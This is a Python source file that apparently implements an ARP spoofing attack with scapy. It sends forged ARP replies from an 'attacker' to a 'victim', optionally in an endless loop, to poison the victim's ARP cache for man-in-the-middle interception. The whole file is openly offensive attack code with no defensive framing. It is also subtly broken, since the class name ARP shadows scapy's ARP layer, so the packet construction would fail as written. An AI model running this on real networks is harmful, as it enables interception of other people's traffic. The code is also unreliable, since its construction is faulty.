#!/usr/bin/env python
from .classes import User
from scapy.all import *
import time

class ARP:
    def __init__(self, attacker: User, victim: User, spoof_ip):
        self.attacker = attacker
        self.victim = victim
        self.spoof_ip = spoof_ip


    def spoof(self, n_times = 0):
        arp = Ether() / ARP()
        arp[Ether].src = self.attacker.MAC
        arp[ARP].hwsrc = self.attacker.MAC

        arp[ARP].psrc = self.spoof_ip

        arp[ARP].hwdst = self.victim.MAC
        arp[ARP].pdst = self.victim.IP

        if n_times == 0:
            sendp(arp, iface="enp0s3", loop = 1)
        else:
            for i in range(n_times):
                sendp(arp, iface="enp0s3")
                time.sleep(300)
